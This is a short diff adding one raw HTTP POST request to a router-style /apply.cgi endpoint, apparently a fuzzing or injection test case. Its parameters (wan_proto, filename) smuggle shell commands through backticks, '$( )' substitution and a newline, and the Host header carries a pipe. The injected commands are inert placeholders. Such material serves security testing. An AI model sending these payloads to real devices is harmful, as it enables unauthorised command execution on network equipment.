@@ -1,0 +1,6 @@
+POST /apply.cgi?check_path HTTP/1.1
+Host: |xhy
+Content-Type: application/json
+Content-Length: 90
+
+wan_proto=pppoe\n`wzq`&%20timestamp=pptp&submit_flag=wifi_channel_coexist&filename=;$(wzq)
